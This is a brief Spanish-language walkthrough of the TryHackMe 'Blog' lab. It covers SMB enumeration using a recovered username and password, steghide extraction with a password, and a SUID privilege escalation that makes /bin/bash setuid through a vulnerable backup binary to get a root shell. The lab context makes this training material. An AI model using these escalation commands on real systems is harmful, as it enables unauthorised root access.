# Blog - TryHackMe

**IP:**  10.10.19.84

## Enumeración SMB
```bash
smbclient //10.10.19.84/BillySMB
Credenciales: kwheel:cutiepie1
  ```

## Steganografía
```bash
steghide extract -sf alice-rabbit-hole
Contraseña: alice
  ```
## Escalada SUID
```bash
find / -perm -4000 2>/dev/null
Explotación de /usr/bin/backup:
  ```
```bash
echo 'chmod +s /bin/bash' > /tmp/exploit
/usr/bin/backup /tmp/exploit
/bin/bash -p
  ```